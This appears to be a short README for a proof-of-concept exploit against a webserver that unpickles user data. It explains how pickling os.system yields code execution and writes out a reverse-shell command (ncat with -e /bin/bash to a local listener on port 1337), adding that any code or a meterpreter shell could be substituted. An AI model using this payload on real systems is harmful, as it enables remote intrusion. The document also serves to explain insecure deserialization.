# pickle vulnerability exploit poc

# how it works
If you look at the webserver's code, it unpickles data from the user (which *should* never happen but does).

What we're doing here is pickling the `os.system` command and using that to gain a reverse tcp shell with a netcat listener running locally on port 1337. When the server unpickles the data, it executes the command (in this case: `os.system("ncat 127.0.0.1 1337 -e /bin/bash")`) to gain a simple shell. This could instead be a meterpreter shell or literally any code you want.
